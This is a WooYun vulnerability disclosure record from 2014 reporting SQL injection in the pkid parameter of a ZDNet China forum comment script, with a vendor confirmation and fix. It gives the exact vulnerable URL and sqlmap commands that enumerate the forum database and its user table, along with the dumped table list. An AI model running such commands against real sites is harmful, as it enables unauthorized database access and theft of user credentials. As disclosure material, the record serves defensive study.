{"id": 4719, "wybug_id": "wooyun-2014-052732", "wybug_title": "至顶网SQL注入之论坛数据暴露并牵连主站数据库", "wybug_corp": "至顶网", "wybug_author": "落", "wybug_date": "2014-03-05 17:57", "wybug_open_date": "2014-04-19 17:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-19：\t细节向公众公开  简要描述： 至顶网SQL注入之论坛数据暴露大量用户信息、管理员泄露并牵连主站数据库。 详细说明：  一：影响URL：http://wo.zdnet.com.cn/comment/fy1.php?mit&replay&pkid=[注入点]&id=comma&type=A&page=1在pkid参数手工测试如图：\n\n二：跑出所有数据库，zd*****貌似是主站的数据库。当前库：discuz_new\n\n三：构造语句：sqlmap.py -u \"http://wo.zdnet.com.cn/comment/fy1.php?mit&replay&pkid=4&id=comma&type=A&page=1\" --tables -D \"discuz_new\" 跑出当前数据库所有表，由于表太多，就不一 一列出了，管理员表、用户表等等。[126 tables]+-----------------------+| bbs_push              || blog_rel_doing        || cdb_access            || cdb_activities        || cdb_activityapplies   || cdb_adminactions      || cdb_admincustom       || cdb_admingroups       || cdb_adminnotes        || cdb_adminsessions     || cdb_advertisements    || cdb_announcements     || cdb_attachments       || cdb_attachpaymentlog  || cdb_attachtypes       || cdb_banned            || cdb_favorites         || cdb_forumfields       || cdb_forumlinks        || cdb_forumrecommend    || cdb_forums            || cdb_forums_bak        || cdb_imagetypes        || cdb_invites           || cdb_itempool          || cdb_lovewall          |       || cdb_threads           || cdb_threadsmod        || cdb_threadtags        || cdb_threadtypes       || cdb_tradecomments     || cdb_tradelog          || cdb_uc_admins         || cdb_uc_applications   || cdb_uc_badwords       || cdb_uc_domains        || cdb_uc_failedlogins   || cdb_uc_feeds          || cdb_uc_friends        || cdb_uc_mailqueue      || cdb_uc_memberfields   || cdb_uc_members        || cdb_uc_mergemembers   || cdb_uc_newpm          || cdb_uc_notelist       || cdb_uc_pms          。     。     。   |+-----------------------+四：“cdb_uc_members”为用户表，大量用户信息泄露如：用户名、密码、邮箱等敏感信息：sqlmap.py -u \"http://wo.zdnet.com.cn/comment/fy1.php?mit&replay&pkid=4&id=comma&type=A&page=1\" --columns -T \"cdb_uc_members\"  --thread \"10\"\n\n   漏洞证明：  有礼物吗- -！   修复方案：  对 pkid 参数过滤   版权声明：转载请注明来源 落@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-03-10 15:48 厂商回复： 谢谢，已经处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}